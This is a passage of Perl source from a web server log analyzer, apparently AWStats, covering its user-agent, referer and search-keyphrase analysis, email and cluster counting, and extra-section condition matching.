/__/;\n\t\t\t\t\t\t\t$_unknownreferer_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\t$_os_h{$uaos}++;\n\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t$_os_p{$uaos}++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( $uaos eq 'Unknown' ) {\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ /__/;\n\t\t\t\t\t\t\t$_unknownreferer_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t}\n\t\t\telse {\n\t\t\t\t$_browser_h{'Unknown'}++;\n\t\t\t\t$_os_h{'Unknown'}++;\n\t\t\t\tif ($PageBool) {\n\t\t\t\t\t$_browser_p{'Unknown'}++;\n\t\t\t\t\t$_os_p{'Unknown'}++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Analyze: Referer\n\t\t\t#-----------------\n\t\t\tmy $found = 0;\n\t\t\tif (   $pos_referer >= 0\n\t\t\t\t&& $LevelForRefererAnalyze\n\t\t\t\t&& $field[$pos_referer] )\n\t\t\t{\n\n\t\t\t\t# Direct ?\n\t\t\t\tif (   $field[$pos_referer] eq '-'\n\t\t\t\t\t|| $field[$pos_referer] eq 'bookmarks' )\n\t\t\t\t{  # \"bookmarks\" is sent by Netscape, '-' by all others browsers\n\t\t\t\t\t    # Direct access\n\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\tif ($ShowDirectOrigin) {\n\t\t\t\t\t\t\tprint \"Direct access for line $line\\n\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_from_p[0]++;\n\t\t\t\t\t}\n\t\t\t\t\t$_from_h[0]++;\n\t\t\t\t\t$found = 1;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t$field[$pos_referer] =~ /$regreferer/o;\n\t\t\t\t\tmy $refererprot   = $1;\n\t\t\t\t\tmy $refererserver =\n\t\t\t\t\t    ( $2 || '' )\n\t\t\t\t\t  . ( !$3 || $3 eq ':80' ? '' : $3 )\n\t\t\t\t\t  ; # refererserver is www.xxx.com or www.xxx.com:81 but not www.xxx.com:80\n\t\t\t\t\t    # HTML link ?\n\t\t\t\t\tif ( $refererprot =~ /^http/i ) {\n\n#if ($Debug) { debug(\"  Analyze referer refererprot=$refererprot refererserver=$refererserver\",5); }\n\n\t\t\t\t\t\t# Kind of origin\n\t\t\t\t\t\tif ( !$TmpRefererServer{$refererserver} )\n\t\t\t\t\t\t{ # TmpRefererServer{$refererserver} is \"=\" if same site, \"search egine key\" if search engine, not defined otherwise\n\t\t\t\t\t\t\tif ( $refererserver =~ /$reglocal/o ) {\n\n\t\t\t\t\t\t  # Intern (This hit came from another page of the site)\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\"  Server '$refererserver' is added to TmpRefererServer with value '='\",\n\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$TmpRefererServer{$refererserver} = '=';\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tforeach (@HostAliases) {\n\t\t\t\t\t\t\t\t\tif ( $refererserver =~ /$_/ ) {\n\n\t\t\t\t\t\t  # Intern (This hit came from another page of the site)\n\t\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\t\tdebug(\n\"  Server '$refererserver' is added to TmpRefererServer with value '='\",\n\t\t\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TmpRefererServer{$refererserver} = '=';\n\t\t\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( !$found ) {\n\n\t\t\t\t\t\t\t # Extern (This hit came from an external web site).\n\n\t\t\t\t\t\t\t\t\tif ($LevelForSearchEnginesDetection) {\n\n\t\t\t\t\t\t\t\t\t\tforeach (@SearchEnginesSearchIDOrder)\n\t\t\t\t\t\t\t\t\t\t{ # Search ID in order of SearchEnginesSearchIDOrder\n\t\t\t\t\t\t\t\t\t\t\tif ( $refererserver =~ /$_/ ) {\n\t\t\t\t\t\t\t\t\t\t\t\tmy $key = &UnCompileRegex($_);\n\t\t\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t\t\t!$NotSearchEnginesKeys{$key}\n\t\t\t\t\t\t\t\t\t\t\t\t\t|| $refererserver !~\n/$NotSearchEnginesKeys{$key}/i\n\t\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\t\t\t # This hit came from the search engine $key\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tdebug(\n\"  Server '$refererserver' is added to TmpRefererServer with value '$key'\",\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t$TmpRefererServer{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$refererserver} =\n\t\t\t\t\t\t\t\t\t\t\t\t\t  $SearchEnginesHashID{ $key\n\t\t\t\t\t\t\t\t\t\t\t\t\t  };\n\t\t\t\t\t\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tmy $tmprefererserver =\n\t\t\t\t\t\t  $TmpRefererServer{$refererserver};\n\t\t\t\t\t\tif ($tmprefererserver) {\n\t\t\t\t\t\t\tif ( $tmprefererserver eq '=' ) {\n\n\t\t\t\t\t\t  # Intern (This hit came from another page of the site)\n\t\t\t\t\t\t\t\tif ($PageBool) { $_from_p[4]++; }\n\t\t\t\t\t\t\t\t$_from_h[4]++;\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t\t\t# This hit came from a search engine\n\t\t\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t\t\t$_from_p[2]++;\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{$tmprefererserver}++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_from_h[2]++;\n\t\t\t\t\t\t\t\t$_se_referrals_h{$tmprefererserver}++;\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\tif ( $PageBool && $LevelForKeywordsDetection ) {\n\n\t\t\t\t\t\t\t\t\t# we will complete %_keyphrases hash array\n\t\t\t\t\t\t\t\t\tmy @refurl =\n\t\t\t\t\t\t\t\t\t  split( /\\?/, $field[$pos_referer], 2 )\n\t\t\t\t\t\t\t\t\t  ; # TODO Use \\? or [$URLQuerySeparators] ?\n\t\t\t\t\t\t\t\t\tif ( $refurl[1] ) {\n\n# Extract params of referer query string (q=cache:mmm:www/zzz+aaa+bbb q=aaa+bbb/ccc key=ddd%20eee lang_en ie=UTF-8 ...)\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t$SearchEnginesKnownUrl{\n\t\t\t\t\t\t\t\t\t\t\t\t$tmprefererserver} )\n\t\t\t\t\t\t\t\t\t\t{  # Search engine with known URL syntax\n\t\t\t\t\t\t\t\t\t\t\tforeach my $param (\n\t\t\t\t\t\t\t\t\t\t\t\tsplit(\n\t\t\t\t\t\t\t\t\t\t\t\t\t/&/,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$KeyWordsNotSensitive\n\t\t\t\t\t\t\t\t\t\t\t\t\t? lc( $refurl[1] )\n\t\t\t\t\t\t\t\t\t\t\t\t\t: $refurl[1]\n\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif ( $param =~\ns/^$SearchEnginesKnownUrl{$tmprefererserver}//\n\t\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\n\t # We found good parameter\n\t # Now param is keyphrase: \"cache:mmm:www/zzz+aaa+bbb/ccc+ddd%20eee'fff,ggg\"\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~\ns/^(cache|related):[^\\+]+//\n\t\t\t\t\t\t\t\t\t\t\t\t\t  ; # Should be useless since this is for hit on 'not pages'\n\t\t\t\t\t\t\t\t\t\t\t\t\t&ChangeWordSeparatorsIntoSpace\n\t\t\t\t\t\t\t\t\t\t\t\t\t  ($param)\n\t\t\t\t\t\t\t\t\t\t\t\t\t  ; # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ] into [ aaa bbb/ccc ddd eee fff ggg]\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/^ +//;\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/ +$//;    # Trim\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~ tr/ /\\+/s;\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ( ( length $param ) > 0 )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$_keyphrases{$param}++;\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\telsif (\n\t\t\t\t\t\t\t\t\t\t\t$LevelForKeywordsDetection >= 2 )\n\t\t\t\t\t\t\t\t\t\t{ # Search engine with unknown URL syntax\n\t\t\t\t\t\t\t\t\t\t\tforeach my $param (\n\t\t\t\t\t\t\t\t\t\t\t\tsplit(\n\t\t\t\t\t\t\t\t\t\t\t\t\t/&/,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$KeyWordsNotSensitive\n\t\t\t\t\t\t\t\t\t\t\t\t\t? lc( $refurl[1] )\n\t\t\t\t\t\t\t\t\t\t\t\t\t: $refurl[1]\n\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tmy $foundexcludeparam = 0;\n\t\t\t\t\t\t\t\t\t\t\t\tforeach my $paramtoexclude (\n\t\t\t\t\t\t\t\t\t\t\t\t\t@WordsToCleanSearchUrl)\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ( $param =~\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t/$paramtoexclude/i )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$foundexcludeparam = 1;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t\t\t} # Not the param with search criteria\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tif ($foundexcludeparam) {\n\t\t\t\t\t\t\t\t\t\t\t\t\tnext;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t\t\t\t# We found good parameter\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/.*=//;\n\n\t\t\t\t\t   # Now param is keyphrase: \"aaa+bbb/ccc+ddd%20eee'fff,ggg\"\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~\n\t\t\t\t\t\t\t\t\t\t\t\t  s/^(cache|related):[^\\+]+//\n\t\t\t\t\t\t\t\t\t\t\t\t  ; # Should be useless since this is for hit on 'not pages'\n\t\t\t\t\t\t\t\t\t\t\t\t&ChangeWordSeparatorsIntoSpace(\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param)\n\t\t\t\t\t\t\t\t\t\t\t\t  ; # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ] into [ aaa bbb/ccc ddd eee fff ggg ]\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/^ +//;\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/ +$//;     # Trim\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ tr/ /\\+/s;\n\t\t\t\t\t\t\t\t\t\t\t\tif ( ( length $param ) > 2 ) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t$_keyphrases{$param}++;\n\t\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}    # End of elsif refurl[1]\n\t\t\t\t\t\t\t\t\telsif (\n\t\t\t\t\t\t\t\t\t\t$SearchEnginesWithKeysNotInQuery{\n\t\t\t\t\t\t\t\t\t\t\t$tmprefererserver} )\n\t\t\t\t\t\t\t\t\t{\n\n#\t\t\t\t\t\t\t\t\t\tdebug(\"xxx\".$refurl[0]);\n# If search engine with key inside page url like a9 (www.a9.com/searchkey1%20searchkey2)\n\t\t\t\t\t\t\t\t\t\tif ( $refurl[0] =~\n/$SearchEnginesKnownUrl{$tmprefererserver}(.*)$/\n\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tmy $param = $1;\n\t\t\t\t\t\t\t\t\t\t\t&ChangeWordSeparatorsIntoSpace(\n\t\t\t\t\t\t\t\t\t\t\t\t$param);\n\t\t\t\t\t\t\t\t\t\t\t$param =~ tr/ /\\+/s;\n\t\t\t\t\t\t\t\t\t\t\tif ( ( length $param ) > 0 ) {\n\t\t\t\t\t\t\t\t\t\t\t\t$_keyphrases{$param}++;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}    # End of if ($TmpRefererServer)\n\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t  # This hit came from a site other than a search engine\n\t\t\t\t\t\t\tif ($PageBool) { $_from_p[3]++; }\n\t\t\t\t\t\t\t$_from_h[3]++;\n\n# http://www.mysite.com/ must be same referer than http://www.mysite.com but .../mypage/ differs of .../mypage\n#if ($refurl[0] =~ /^[^\\/]+\\/$/) { $field[$pos_referer] =~ s/\\/$//; }\t# Code moved in Save_History\n# TODO: lowercase the value for referer server to have refering server not case sensitive\n\t\t\t\t\t\t\tif ($URLReferrerWithQuery) {\n\t\t\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t\t\t$_pagesrefs_p{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t\t\t# We discard query for referer\n\t\t\t\t\t\t\t\tif ( $field[$pos_referer] =~\n\t\t\t\t\t\t\t\t\t/$regreferernoquery/o )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif ($PageBool) { $_pagesrefs_p{\"$1\"}++; }\n\t\t\t\t\t\t\t\t\t$_pagesrefs_h{\"$1\"}++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_p{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\t# News Link ?\n\t\t\t\t\t#if (! $found && $refererprot =~ /^news/i) {\n\t\t\t\t\t#\t$found=1;\n\t\t\t\t\t#\tif ($PageBool) { $_from_p[5]++; }\n\t\t\t\t\t#\t$_from_h[5]++;\n\t\t\t\t\t#}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Origin not found\n\t\t\tif ( !$found ) {\n\t\t\t\tif ($ShowUnknownOrigin) {\n\t\t\t\t\tprint \"Unknown origin: $field[$pos_referer]\\n\";\n\t\t\t\t}\n\t\t\t\tif ($PageBool) { $_from_p[1]++; }\n\t\t\t\t$_from_h[1]++;\n\t\t\t}\n\n\t\t\t# Analyze: EMail\n\t\t\t#---------------\n\t\t\tif ( $pos_emails >= 0 && $field[$pos_emails] ) {\n\t\t\t\tif ( $field[$pos_emails] eq '<>' ) {\n\t\t\t\t\t$field[$pos_emails] = 'Unknown';\n\t\t\t\t}\n\t\t\t\telsif ( $field[$pos_emails] !~ /\\@/ ) {\n\t\t\t\t\t$field[$pos_emails] .= \"\\@$SiteDomain\";\n\t\t\t\t}\n\t\t\t\t$_emails_h{ lc( $field[$pos_emails] ) }\n\t\t\t\t  ++;    #Count accesses for sender email (hit)\n\t\t\t\tif ($pos_size>0){$_emails_k{ lc( $field[$pos_emails] ) } +=\n\t\t\t\t  int( $field[$pos_size] )\n\t\t\t\t  ;}      #Count accesses for sender email (kb)\n\t\t\t\t$_emails_l{ lc( $field[$pos_emails] ) } = $timerecord;\n\t\t\t}\n\t\t\tif ( $pos_emailr >= 0 && $field[$pos_emailr] ) {\n\t\t\t\tif ( $field[$pos_emailr] !~ /\\@/ ) {\n\t\t\t\t\t$field[$pos_emailr] .= \"\\@$SiteDomain\";\n\t\t\t\t}\n\t\t\t\t$_emailr_h{ lc( $field[$pos_emailr] ) }\n\t\t\t\t  ++;    #Count accesses for receiver email (hit)\n\t\t\t\tif ($pos_size>0){$_emailr_k{ lc( $field[$pos_emailr] ) } +=\n\t\t\t\t  int( $field[$pos_size] )\n\t\t\t\t  ;}      #Count accesses for receiver email (kb)\n\t\t\t\t$_emailr_l{ lc( $field[$pos_emailr] ) } = $timerecord;\n\t\t\t}\n\t\t}\n\n\t\t# Check cluster\n\t\t#--------------\n\t\tif ( $pos_cluster >= 0 ) {\n\t\t\tif ($PageBool) {\n\t\t\t\t$_cluster_p{ $field[$pos_cluster] }++;\n\t\t\t}    #Count accesses for page (page)\n\t\t\t$_cluster_h{ $field[$pos_cluster] }\n\t\t\t  ++;    #Count accesses for page (hit)\n\t\t\tif ($pos_size>0){$_cluster_k{ $field[$pos_cluster] } +=\n\t\t\t  int( $field[$pos_size] );}    #Count accesses for page (kb)\n\t\t}\n\n\t\t# Analyze: Extra\n\t\t#---------------\n\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\tif ($Debug) { debug( \"  Process extra analyze $extranum\", 4 ); }\n\n\t\t\t# Check code\n\t\t\tmy $conditionok = 0;\n\t\t\tif ( $ExtraCodeFilter[$extranum] ) {\n\t\t\t\tforeach\n\t\t\t\t  my $condnum ( 0 .. @{ $ExtraCodeFilter[$extranum] } - 1 )\n\t\t\t\t{\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check code '$field[$pos_code]' must be '$ExtraCodeFilter[$extranum][$condnum]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_code] eq\n\t\t\t\t\t\t\"$ExtraCodeFilter[$extranum][$condnum]\" )\n\t\t\t\t\t{\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !$conditionok && @{ $ExtraCodeFilter[$extranum] } ) {\n\t\t\t\t\tnext;\n\t\t\t\t}    # End for this section\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\"  No check on code or code is OK. Now we check other conditions.\",\n\t\t\t\t\t\t5\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Check conditions\n\t\t\t$conditionok = 0;\n\t\t\tforeach my $condnum ( 0 .. @{ $ExtraConditionType[$extranum] } - 1 )\n\t\t\t{\n\t\t\t\tmy $conditiontype    = $ExtraConditionType[$extranum][$condnum];\n\t\t\t\tmy $conditiontypeval =\n\t\t\t\t  $ExtraConditionTypeVal[$extranum][$condnum];\n\t\t\t\tif ( $conditiontype eq 'URL' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $urlwithnoquery =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'QUERY_STRING' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$standalonequery'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $standalonequery =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'URLWITHQUERY' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery$tokenquery$standalonequery'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( \"$urlwithnoquery$tokenquery$standalonequery\" =~\n\t\t\t\t\t\t/$conditiontypeval/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'REFERER' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_referer]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_referer] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'UA' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_agent]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_agent] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'HOSTINLOG' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_host]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_host] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'HOST' ) {\n\t\t\t\t\tmy $hosttouse = ( $HostResolved ? $HostResolved : $Host );\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$hosttouse'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $hosttouse =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'VHOST' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condision '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_vh]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_vh] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype =~ /extra(\\d+)/i ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_extra[$1]]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[ $pos_extra[$1] ] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\terror(\n\"Wrong value of parameter ExtraSectionCondition$extranum\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( !$conditionok && @{ $ExtraConditionType[$extranum] } ) {\n\t\t\t\tnext;\n\t\t\t}    # End for this section\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\"  No condition or condition is OK. Now we extract value for first column of extra chart.\",\n\t\t\t\t\t5\n\t\t\t\t);\n\t\t\t}\n\n\t\t\t# Determine actual column value to use.\n\t\t\tmy $rowkeyval;\n\t\t\tmy $rowkeyok = 0;\n\t\t\tforeach my $rowkeynum (\n\t\t\t\t0 .. @{ $ExtraFirstColumnValuesType[$extranum] } - 1 )\n\t\t\t{\n\t\t\t\tmy $rowkeytype =\n\t\t\t\t  $ExtraFirstColumnValuesType[$extranum][$rowkeynum];\n\t\t\t\tmy $rowkeytypeval =\n\t\t\t\t  $ExtraFirstColumnValuesTypeVal[$extranum][$rowkeynum];\n\t\t\t\tif ( $rowkeytype eq 'URL' ) {\n\t\t\t\t\tif ( $urlwithnoquery =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'QUERY_STRING' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Extract value from '$standalonequery' with regex '$rowkeytypeval'.\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $standalonequery =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'URLWITHQUERY' ) {\n\t\t\t\t\tif ( \"$urlwithnoquery$tokenquery$standalonequery\" =~\n\t\t\t\t\t\t/$rowkeytypeval/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'REFERER' ) {\n\t\t\t\t\tif ( $field[$pos_referer] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'UA' ) {\n\t\t\t\t\tif ( $field[$pos_agent] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'HOSTINLOG' ) {\n\t\t\t\t\tif ( $field[$pos_host] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'HOST' ) {\n\t\t\t\t\tmy $hosttouse = ( $HostResolved ? 